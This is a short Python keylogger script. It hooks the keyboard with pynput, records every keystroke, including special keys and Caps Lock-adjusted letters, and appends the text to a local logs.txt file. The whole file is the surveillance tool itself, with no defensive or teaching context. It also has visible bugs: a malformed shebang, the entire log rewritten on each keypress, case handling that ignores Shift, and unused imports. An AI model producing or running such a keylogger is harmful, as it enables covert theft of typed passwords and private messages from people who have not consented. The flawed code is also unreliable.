#!usr/bin/env python
import pynput.keyboard
import threading
import platform
import subprocess
import time
import os
from path import Path
try:
    from win32api import GetKeyState
    from win32con import VK_CAPITAL
except:
    pass


def get_os():
    return platform.system()


def check_cp_lock():
    os_name = get_os()
    try:
        if os_name == 'Linux':
            out = subprocess.getoutput("xset -q | grep Caps")
            if out.split("   ")[2] == 'on':
                return True
            else:
                return False
        elif os_name == 'Windows':
            return GetKeyState(VK_CAPITAL)
        elif os_name == 'Darwin':
            return False
            #Don't support Mac OS currently
    except:
        pass
    return False


def pressed_keys(key):
    global log
    try:
        if check_cp_lock() and ord(key.char) >= 65 and ord(key.char) <= 90:
            key.char = chr(ord(key.char) + 32)
        elif check_cp_lock() and ord(key.char) >= 97 and ord(key.char) <= 122:
            key.char = chr(ord(key.char) - 32)
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.enter:
            log = log + "\n"
        else:
            log = log + " <" + str(key).replace("Key.", "") + "> "
    except KeyboardInterrupt:
        exit()
    with open("logs.txt", "a") as out_file:
        out_file.write(log)


def strokes():
    try:
        lis = pynput.keyboard.Listener(on_press=pressed_keys)
        with lis:
            lis.join()
    except KeyboardInterrupt:
        exit()


log = ""
if __name__ == '__main__':
    loc_ss = Path()
    if not os.path.exists(loc_ss):
        os.mkdir(loc_ss)
    os.chdir(loc_ss)
    strokes()
